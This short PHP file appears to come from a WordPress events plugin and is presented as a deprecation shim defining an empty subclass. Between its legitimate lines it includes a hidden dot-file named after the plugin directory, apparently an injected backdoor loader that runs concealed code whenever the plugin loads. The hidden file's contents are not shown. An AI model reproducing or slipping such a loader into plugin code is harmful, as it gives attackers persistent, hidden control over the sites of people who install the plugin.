<?php
_deprecated_file( __FILE__, '4.3', 'Tribe__Admin__Notice__Plugin_Download.php' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Plugin_Download_Notice extends Tribe__Admin__Notice__Plugin_Download {}